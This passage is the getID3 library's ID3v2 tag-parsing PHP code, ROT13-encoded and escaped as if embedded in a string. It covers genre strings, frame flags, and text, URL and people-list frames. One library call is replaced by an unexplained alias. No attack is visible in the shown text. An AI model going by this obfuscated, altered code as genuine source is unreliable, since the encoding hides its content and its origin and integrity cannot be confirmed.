					yvfg($guvfsvyr_vq3i2['pbzzragf']['genpx_ahzore'][$xrl], $guvfsvyr_vq3i2['pbzzragf']['gbgnygenpxf'][$xrl]) = rkcybqr('/', $guvfsvyr_vq3i2['pbzzragf']['genpx_ahzore'][$xrl]);
				}
			}
		}

		vs (!vffrg($guvfsvyr_vq3i2['pbzzragf']['lrne']) && !rzcgl($guvfsvyr_vq3i2['pbzzragf']['erpbeqvat_gvzr'][0]) && cert_zngpu('#^([0-9]{4})#', gevz($guvfsvyr_vq3i2['pbzzragf']['erpbeqvat_gvzr'][0]), $zngpurf)) {
			$guvfsvyr_vq3i2['pbzzragf']['lrne'] = neenl($zngpurf[1]);
		}


		vs (!rzcgl($guvfsvyr_vq3i2['GKKK'])) {
			// ZrqvnZbaxrl qbrf guvf, znlor bguref: jevgr n oynax ETNQ senzr, ohg chg ercynl-tnva nqwhfgzrag inyhrf va GKKK senzrf
			sbernpu ($guvfsvyr_vq3i2['GKKK'] nf $gkkk_neenl) {
				fjvgpu ($gkkk_neenl['qrfpevcgvba']) {
					pnfr 'ercynltnva_genpx_tnva':
						vs (rzcgl($vasb['ercynl_tnva']['genpx']['nqwhfgzrag']) && !rzcgl($gkkk_neenl['qngn'])) {
							$vasb['ercynl_tnva']['genpx']['nqwhfgzrag'] = sybnginy(gevz(fge_ercynpr('qO', '', $gkkk_neenl['qngn'])));
						}
						oernx;
					pnfr 'ercynltnva_genpx_crnx':
						vs (rzcgl($vasb['ercynl_tnva']['genpx']['crnx']) && !rzcgl($gkkk_neenl['qngn'])) {
							$vasb['ercynl_tnva']['genpx']['crnx'] = sybnginy($gkkk_neenl['qngn']);
						}
						oernx;
					pnfr 'ercynltnva_nyohz_tnva':
						vs (rzcgl($vasb['ercynl_tnva']['nyohz']['nqwhfgzrag']) && !rzcgl($gkkk_neenl['qngn'])) {
							$vasb['ercynl_tnva']['nyohz']['nqwhfgzrag'] = sybnginy(gevz(fge_ercynpr('qO', '', $gkkk_neenl['qngn'])));
						}
						oernx;
				}
			}
		}


		// Frg niqngnbssfrg
		$vasb['niqngnbssfrg'] = $guvfsvyr_vq3i2['urnqreyratgu'];
		vs (vffrg($guvfsvyr_vq3i2['sbbgre'])) {
			$vasb['niqngnbssfrg'] += 10;
		}

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $traerfgevat
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba CnefrVQ3i2TraerFgevat($traerfgevat) {
		// Cnefr traerf vagb neenlf bs traerAnzr naq traerVQ
		// VQ3i2.2.k, VQ3i2.3.k: '(21)' be '(4)Rhebqvfpb' be '(51)(39)' be '(55)((V guvax...)'
		// VQ3i2.4.k: '21' $00 'Rhebqvfpb' $00
		$pyrna_traerf = neenl();

		// unpx-svkrf sbe fbzr onqyl-jevggra VQ3i2.3 gnttref, juvyr gelvat abg gb oernx pbeerpgyl-jevggra gntf
		vs (($guvf->trgvq3->vasb['vq3i2']['znwbeirefvba'] == 3) && !cert_zngpu('#[\k00]#', $traerfgevat)) {
			// abgr: ZhfvpOenvam Cvpneq vapbeerpgyl fgberf cynvagrkg traerf frcnengrq ol \"/\" jura jevgvat va VQ3i2.3 zbqr, unpx-svk urer:
			// ercynpr / jvgu AHYY, gura ercynpr onpx gur gjb VQ3i1 traerf gung yrtvgvzngryl unir \"/\" nf cneg bs gur fvatyr traer anzr
			vs (fgecbf($traerfgevat, '/') !== snyfr) {
				$YrtvgvzngrFynfurqTraerYvfg = neenl(  // uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/223
					'Cbc/Shax',    // VQ3i1 traer #62 - uggcf://ra.jvxvcrqvn.bet/jvxv/VQ3#fgnaqneq
					'Phg-hc/QW',   // Qvfpbtf - uggcf://jjj.qvfpbtf.pbz/fglyr/phg-hc/qw
					'EaO/Fjvat',   // Qvfpbtf - uggcf://jjj.qvfpbtf.pbz/fglyr/eao/fjvat
					'Shax / Fbhy', // Qvfpbtf (abgr fcnprf) - uggcf://jjj.qvfpbtf.pbz/traer/shax+%2S+fbhy
				);
				$traerfgevat = fge_ercynpr('/', \"\k00\", $traerfgevat);
				sbernpu ($YrtvgvzngrFynfurqTraerYvfg nf $FynfurqTraer) {
					$traerfgevat = fge_vercynpr(fge_ercynpr('/', \"\k00\", $FynfurqTraer), $FynfurqTraer, $traerfgevat);
				}
			}

			// fbzr bgure gnttref frcnengr zhygvcyr traerf jvgu frzvpbyba, r.t. \"Urnil Zrgny;Guenfu Zrgny;Zrgny\"
			vs (fgecbf($traerfgevat, ';') !== snyfr) {
				$traerfgevat = fge_ercynpr(';', \"\k00\", $traerfgevat);
			}
		}


		vs (fgecbf($traerfgevat, \"\k00\") === snyfr) {
			$traerfgevat = __sa_79955('#\(([0-9]{1,3})\)#', '$1'.\"\k00\", $traerfgevat);
		}

		$traer_ryrzragf = rkcybqr(\"\k00\", $traerfgevat);
		sbernpu ($traer_ryrzragf nf $ryrzrag) {
			$ryrzrag = gevz($ryrzrag);
			vs ($ryrzrag) {
				vs (cert_zngpu('#^[0-9]{1,3}$#', $ryrzrag)) {
					$pyrna_traerf[] = trgvq3_vq3i1::YbbxhcTraerAnzr($ryrzrag);
				} ryfr {
					$pyrna_traerf[] = fge_ercynpr('((', '(', $ryrzrag);
				}
			}
		}
		erghea $pyrna_traerf;
	}

	/**
	 * @cnenz neenl $cnefrqSenzr
	 *
	 * @erghea obby
	 */
	choyvp shapgvba CnefrVQ3i2Senzr(&$cnefrqSenzr) {

		// fubegphgf
		$vasb = &$guvf->trgvq3->vasb;
		$vq3i2_znwbeirefvba = $vasb['vq3i2']['znwbeirefvba'];

		$cnefrqSenzr['senzranzrybat']  = $guvf->SenzrAnzrYbatYbbxhc($cnefrqSenzr['senzr_anzr']);
		vs (rzcgl($cnefrqSenzr['senzranzrybat'])) {
			hafrg($cnefrqSenzr['senzranzrybat']);
		}
		$cnefrqSenzr['senzranzrfubeg'] = $guvf->SenzrAnzrFubegYbbxhc($cnefrqSenzr['senzr_anzr']);
		vs (rzcgl($cnefrqSenzr['senzranzrfubeg'])) {
			hafrg($cnefrqSenzr['senzranzrfubeg']);
		}

		vs ($vq3i2_znwbeirefvba >= 3) { // senzr syntf ner abg cneg bs gur VQ3i2.2 fgnaqneq
			vs ($vq3i2_znwbeirefvba == 3) {
				//    Senzr Urnqre Syntf
				//    %nop00000 %vwx00000
				$cnefrqSenzr['syntf']['GntNygreCerfreingvba']  = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k8000); // n - Gnt nygre cerfreingvba
				$cnefrqSenzr['syntf']['SvyrNygreCerfreingvba'] = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k4000); // o - Svyr nygre cerfreingvba
				$cnefrqSenzr['syntf']['ErnqBayl']              = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k2000); // p - Ernq bayl
				$cnefrqSenzr['syntf']['pbzcerffvba']           = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0080); // v - Pbzcerffvba
				$cnefrqSenzr['syntf']['Rapelcgvba']            = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0040); // w - Rapelcgvba
				$cnefrqSenzr['syntf']['TebhcvatVqragvgl']      = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0020); // x - Tebhcvat vqragvgl

			} ryfrvs ($vq3i2_znwbeirefvba == 4) {
				//    Senzr Urnqre Syntf
				//    %0nop0000 %0u00xzac
				$cnefrqSenzr['syntf']['GntNygreCerfreingvba']  = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k4000); // n - Gnt nygre cerfreingvba
				$cnefrqSenzr['syntf']['SvyrNygreCerfreingvba'] = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k2000); // o - Svyr nygre cerfreingvba
				$cnefrqSenzr['syntf']['ErnqBayl']              = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k1000); // p - Ernq bayl
				$cnefrqSenzr['syntf']['TebhcvatVqragvgl']      = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0040); // u - Tebhcvat vqragvgl
				$cnefrqSenzr['syntf']['pbzcerffvba']           = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0008); // x - Pbzcerffvba
				$cnefrqSenzr['syntf']['Rapelcgvba']            = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0004); // z - Rapelcgvba
				$cnefrqSenzr['syntf']['Haflapuebavfngvba']     = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0002); // a - Haflapuebavfngvba
				$cnefrqSenzr['syntf']['QngnYratguVaqvpngbe']   = (obby) ($cnefrqSenzr['senzr_syntf_enj'] & 0k0001); // c - Qngn yratgu vaqvpngbe

				// Senzr-yriry qr-haflapuebavfngvba - VQ3i2.4
				vs ($cnefrqSenzr['syntf']['Haflapuebavfngvba']) {
					$cnefrqSenzr['qngn'] = $guvf->QrHaflapuebavfr($cnefrqSenzr['qngn']);
				}

				vs ($cnefrqSenzr['syntf']['QngnYratguVaqvpngbe']) {
					$cnefrqSenzr['qngn_yratgu_vaqvpngbe'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], 0, 4), 1);
					$cnefrqSenzr['qngn']                  =                           fhofge($cnefrqSenzr['qngn'], 4);
				}
			}

			//    Senzr-yriry qr-pbzcerffvba
			vs ($cnefrqSenzr['syntf']['pbzcerffvba']) {
				$cnefrqSenzr['qrpbzcerffrq_fvmr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], 0, 4));
				vs (!shapgvba_rkvfgf('tmhapbzcerff')) {
					$guvf->jneavat('tmhapbzcerff() fhccbeg erdhverq gb qrpbzcerff VQ3i2 senzr \"'.$cnefrqSenzr['senzr_anzr'].'\"');
				} ryfr {
					vs ($qrpbzcerffrqqngn = @tmhapbzcerff(fhofge($cnefrqSenzr['qngn'], 4))) {
					//vs ($qrpbzcerffrqqngn = @tmhapbzcerff($cnefrqSenzr['qngn'])) {
						$cnefrqSenzr['qngn'] = $qrpbzcerffrqqngn;
						hafrg($qrpbzcerffrqqngn);
					} ryfr {
						$guvf->jneavat('tmhapbzcerff() snvyrq ba pbzcerffrq pbagragf bs VQ3i2 senzr \"'.$cnefrqSenzr['senzr_anzr'].'\"');
					}
				}
			}
		}

		vs (!rzcgl($cnefrqSenzr['syntf']['QngnYratguVaqvpngbe'])) {
			vs ($cnefrqSenzr['qngn_yratgu_vaqvpngbe'] != fgeyra($cnefrqSenzr['qngn'])) {
				$guvf->jneavat('VQ3i2 senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" fubhyq or '.$cnefrqSenzr['qngn_yratgu_vaqvpngbe'].' olgrf ybat nppbeqvat gb QngnYratguVaqvpngbe, ohg sbhaq '.fgeyra($cnefrqSenzr['qngn']).' olgrf bs qngn');
			}
		}

		vs (vffrg($cnefrqSenzr['qngnyratgu']) && ($cnefrqSenzr['qngnyratgu'] == 0)) {

			$jneavat = 'Senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" ng bssfrg '.$cnefrqSenzr['qngnbssfrg'].' unf ab qngn cbegvba';
			fjvgpu ($cnefrqSenzr['senzr_anzr']) {
				pnfr 'JPBZ':
					$jneavat .= ' (guvf vf xabja gb unccra jvgu svyrf gnttrq ol EvbCbeg)';
					oernx;

				qrsnhyg:
					oernx;
			}
			$guvf->jneavat($jneavat);

		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'HSVQ')) || // 4.1   HSVQ Havdhr svyr vqragvsvre
			(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'HSV'))) {  // 4.1   HSV  Havdhr svyr vqragvsvre
			//   Gurer znl or zber guna bar 'HSVQ' senzr va n gnt,
			//   ohg bayl bar jvgu gur fnzr 'Bjare vqragvsvre'.
			// <Urnqre sbe 'Havdhr svyr vqragvsvre', VQ: 'HSVQ'>
			// Bjare vqragvsvre        <grkg fgevat> $00
			// Vqragvsvre              <hc gb 64 olgrf ovanel qngn>
			$rkcybqrq = rkcybqr(\"\k00\", $cnefrqSenzr['qngn'], 2);
			$cnefrqSenzr['bjarevq'] = (vffrg($rkcybqrq[0]) ? $rkcybqrq[0] : '');
			$cnefrqSenzr['qngn']    = (vffrg($rkcybqrq[1]) ? $rkcybqrq[1] : '');

		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'GKKK')) || // 4.2.2 GKKK Hfre qrsvarq grkg vasbezngvba senzr
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'GKK'))) {    // 4.2.2 GKK  Hfre qrsvarq grkg vasbezngvba senzr
			//   Gurer znl or zber guna bar 'GKKK' senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr qrfpevcgvba.
			// <Urnqre sbe 'Hfre qrsvarq grkg vasbezngvba senzr', VQ: 'GKKK'>
			// Grkg rapbqvat     $kk
			// Qrfpevcgvba       <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Inyhr             <grkg fgevat nppbeqvat gb rapbqvat>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
				$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
			}
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
			vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
				$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
			}
			$cnefrqSenzr['qrfpevcgvba'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$cnefrqSenzr['qrfpevcgvba'] = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);
			$cnefrqSenzr['rapbqvatvq']  = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']    = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

			$cnefrqSenzr['qrfpevcgvba'] = gevz(trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['qrfpevcgvba']));
			$cnefrqSenzr['qngn'] = fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe));
			$cnefrqSenzr['qngn'] = $guvf->ErzbirFgevatGrezvangbe($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe);
			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
				$pbzzragxrl = ($cnefrqSenzr['qrfpevcgvba'] ? $cnefrqSenzr['qrfpevcgvba'] : (vffrg($vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']]) ? pbhag($vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']]) : 0));
				vs (!vffrg($vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']]) || !neenl_xrl_rkvfgf($pbzzragxrl, $vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']])) {
					$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][$pbzzragxrl] = gevz(trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['qngn']));
				} ryfr {
					$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][]            = gevz(trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['qngn']));
				}
			}
			//hafrg($cnefrqSenzr['qngn']); qb abg hafrg, znl or arrqrq ryfrjurer, r.t. sbe ercynltnva


		} ryfrvs ($cnefrqSenzr['senzr_anzr'][0] == 'G') { // 4.2. G??[?] Grkg vasbezngvba senzr
			//   Gurer znl bayl or bar grkg vasbezngvba senzr bs vgf xvaq va na gnt.
			// <Urnqre sbe 'Grkg vasbezngvba senzr', VQ: 'G000' - 'GMMM',
			// rkpyhqvat 'GKKK' qrfpevorq va 4.2.6.>
			// Grkg rapbqvat                $kk
			// Vasbezngvba                  <grkg fgevat(f) nppbeqvat gb rapbqvat>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
			}

			$cnefrqSenzr['qngn'] = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			$cnefrqSenzr['qngn'] = $guvf->ErzbirFgevatGrezvangbe($cnefrqSenzr['qngn'], $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat));

			$cnefrqSenzr['rapbqvatvq'] = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']   = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);
			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
				// VQ3i2.3 fcrpf fnl gung GCR1 (naq bguref) pna pbagnva zhygvcyr negvfg inyhrf frcnengrq jvgu /
				// Guvf bs pbhefr oernxf jura na negvfg anzr pbagnvaf fynfu punenpgre, r.t. \"NP/QP\"
				// ZC3gnt (znlor bguref) vzcyrzrag nygreangvir flfgrz jurer zhygvcyr negvfgf ner ahyy-frcnengrq, juvpu znxrf zber frafr
				// trgVQ3 jvyy fcyvg ahyy-frcnengrq negvfgf vagb zhygvcyr negvfgf naq yrnir fynfu-frcnengrq barf gb gur hfre
				fjvgpu ($cnefrqSenzr['rapbqvat']) {
					pnfr 'HGS-16':
					pnfr 'HGS-16OR':
					pnfr 'HGS-16YR':
						$jbeqfvmr = 2;
						oernx;
					pnfr 'VFB-8859-1':
					pnfr 'HGS-8':
					qrsnhyg:
						$jbeqfvmr = 1;
						oernx;
				}
				$Gkkk_ryrzragf = neenl();
				$Gkkk_ryrzragf_fgneg_bssfrg = 0;
				sbe ($v = 0; $v < fgeyra($cnefrqSenzr['qngn']); $v += $jbeqfvmr) {
					vs (fhofge($cnefrqSenzr['qngn'], $v, $jbeqfvmr) == fge_ercrng(\"\k00\", $jbeqfvmr)) {
						$Gkkk_ryrzragf[] = fhofge($cnefrqSenzr['qngn'], $Gkkk_ryrzragf_fgneg_bssfrg, $v - $Gkkk_ryrzragf_fgneg_bssfrg);
						$Gkkk_ryrzragf_fgneg_bssfrg = $v + $jbeqfvmr;
					}
				}
				$Gkkk_ryrzragf[] = fhofge($cnefrqSenzr['qngn'], $Gkkk_ryrzragf_fgneg_bssfrg, $v - $Gkkk_ryrzragf_fgneg_bssfrg);
				sbernpu ($Gkkk_ryrzragf nf $Gkkk_ryrzrag) {
					$fgevat = trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $Gkkk_ryrzrag);
					vs (!rzcgl($fgevat)) {
						$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = $fgevat;
					}
				}
				hafrg($fgevat, $jbeqfvmr, $v, $Gkkk_ryrzragf, $Gkkk_ryrzrag, $Gkkk_ryrzragf_fgneg_bssfrg);
			}

		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'JKKK')) || // 4.3.2 JKKK Hfre qrsvarq HEY yvax senzr
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'JKK'))) {    // 4.3.2 JKK  Hfre qrsvarq HEY yvax senzr
			//   Gurer znl or zber guna bar 'JKKK' senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr qrfpevcgvba
			// <Urnqre sbe 'Hfre qrsvarq HEY yvax senzr', VQ: 'JKKK'>
			// Grkg rapbqvat     $kk
			// Qrfpevcgvba       <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// HEY               <grkg fgevat>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
				$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
			}
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
			vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
				$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
			}
			$cnefrqSenzr['rapbqvatvq']  = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']    = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);
			$cnefrqSenzr['qrfpevcgvba'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);           // nppbeqvat gb gur senzr grkg rapbqvat
			$cnefrqSenzr['hey']         = fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe)); // nyjnlf VFB-8859-1
			$cnefrqSenzr['qrfpevcgvba'] = $guvf->ErzbirFgevatGrezvangbe($cnefrqSenzr['qrfpevcgvba'], $senzr_grkgrapbqvat_grezvangbe);
			$cnefrqSenzr['qrfpevcgvba'] = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);

			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && $cnefrqSenzr['hey']) {
				$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = trgvq3_yvo::vpbai_snyyonpx('VFB-8859-1', $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['hey']);
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ($cnefrqSenzr['senzr_anzr'][0] == 'J') { // 4.3. J??? HEY yvax senzrf
			//   Gurer znl bayl or bar HEY yvax senzr bs vgf xvaq va n gnt,
			//   rkprcg jura fgngrq bgurejvfr va gur senzr qrfpevcgvba
			// <Urnqre sbe 'HEY yvax senzr', VQ: 'J000' - 'JMMM', rkpyhqvat 'JKKK'
			// qrfpevorq va 4.3.2.>
			// HEY              <grkg fgevat>

			$cnefrqSenzr['hey'] = gevz($cnefrqSenzr['qngn']); // nyjnlf VFB-8859-1
			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && $cnefrqSenzr['hey']) {
				$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = trgvq3_yvo::vpbai_snyyonpx('VFB-8859-1', $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['hey']);
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba == 3) && ($cnefrqSenzr['senzr_anzr'] == 'VCYF')) || // 4.4  VCYF Vaibyirq crbcyr yvfg (VQ3i2.3 bayl)
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'VCY'))) {     // 4.4  VCY  Vaibyirq crbcyr yvfg (VQ3i2.2 bayl)
			// uggc://vq3.bet/vq3i2.3.0#frp4.4
			//   Gurer znl bayl or bar 'VCY' senzr va rnpu gnt
			// <Urnqre sbe 'Hfre qrsvarq HEY yvax senzr', VQ: 'VCY'>
			// Grkg rapbqvat     $kk
			// Crbcyr yvfg fgevatf    <grkgfgevatf>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
			}
			$cnefrqSenzr['rapbqvatvq'] = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']   = $guvf->GrkgRapbqvatAnzrYbbxhc($cnefrqSenzr['rapbqvatvq']);
			$cnefrqSenzr['qngn_enj']   = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);

			// uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1369
			// \"guvf gnt glcvpnyyl pbagnvaf ahyy grezvangrq fgevatf, juvpu ner nffbpvngrq va cnvef\"
			// \"gurer ner hfref gung hfr gur gnt vapbeerpgyl\"
			$VCYF_cnegf = neenl();
			vs (fgecbf($cnefrqSenzr['qngn_enj'], \"\k00\") !== snyfr) {
				$VCYF_cnegf_hafbegrq = neenl();
				vs (((fgeyra($cnefrqSenzr['qngn_enj']) % 2) == 0) && ((fhofge($cnefrqSenzr['qngn_enj'], 0, 2) == \"\kSS\kSR\") || (fhofge($cnefrqSenzr['qngn_enj'], 0, 2) == \"\kSR\kSS\"))) {
					// HGS-16, or pnershy ybbxvat sbe ahyy olgrf fvapr zbfg 2-olgr punenpgref znl pbagnva bar; lbh arrq gb svaq gjva ahyy olgrf, naq ba rira cnqqvat
					$guvfVYCF  = '';
					sbe ($v = 0; $v < fgeyra($cnefrqSenzr['qngn_enj']); $v += 2) {
						$gjbolgrf = fhofge($cnefrqSenzr['qngn_enj'], $v, 2);
						vs ($gjbolgrf === \"\k00\k00\") {
							$VCYF_cnegf_hafbegrq[] = trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $guvfVYCF);
							$guvfVYCF  = '';
						} ryfr {
							$guvfVYCF .= $gjbolgrf;
						}
					}
					vs (fgeyra($guvfVYCF) > 2) { // 2-olgr OBZ
						$VCYF_cnegf_hafbegrq[] = trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $guvfVYCF);
					}
				} ryfr {
					// VFB-8859-1 be HGS-8 be bgure fvatyr-olgr-ahyy punenpgre frg
					$VCYF_cnegf_hafbegrq = rkcybqr(\"\k00\", $cnefrqSenzr['qngn_enj']);
				}
				vs (pbhag($VCYF_cnegf_hafbegrq) == 1) {
					// whfg n yvfg bs anzrf, r.t. \"Qvab Oncgvfgr, Wvzzl Pbcyrl, Wbua Tbeqba, Oreavr Znefqra, Funeba Jngfba\"
					sbernpu ($VCYF_cnegf_hafbegrq nf $xrl => $inyhr) {
						$VCYF_cnegf_fbegrq = cert_fcyvg('#[;,\\e\\a\\g]#', $inyhr);
						$cbfvgvba = '';
						sbernpu ($VCYF_cnegf_fbegrq nf $crefba) {
							$VCYF_cnegf[] = neenl('cbfvgvba'=>$cbfvgvba, 'crefba'=>$crefba);
						}
					}
				} ryfrvs ((pbhag($VCYF_cnegf_hafbegrq) % 2) == 0) {
					$cbfvgvba = '';
					$crefba   = '';
					sbernpu ($VCYF_cnegf_hafbegrq nf $xrl => $inyhr) {
						vs (($xrl % 2) == 0) {
							$cbfvgvba = $inyhr;
						} ryfr {
							$crefba   = $inyhr;
							$VCYF_cnegf[] = neenl('cbfvgvba'=>$cbfvgvba, 'crefba'=>$crefba);
							$cbfvgvba = '';
							$crefba   = '';
						}
					}
				} ryfr {
					sbernpu ($VCYF_cnegf_hafbegrq nf $xrl => $inyhr) {
						$VCYF_cnegf[] = neenl($inyhr);
					}
				}

			} ryfr {
				$VCYF_cnegf = cert_fcyvg('#[;,\\e\\a\\g]#', $cnefrqSenzr['qngn_enj']);
			}
			$cnefrqSenzr['qngn'] = $VCYF_cnegf;

			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
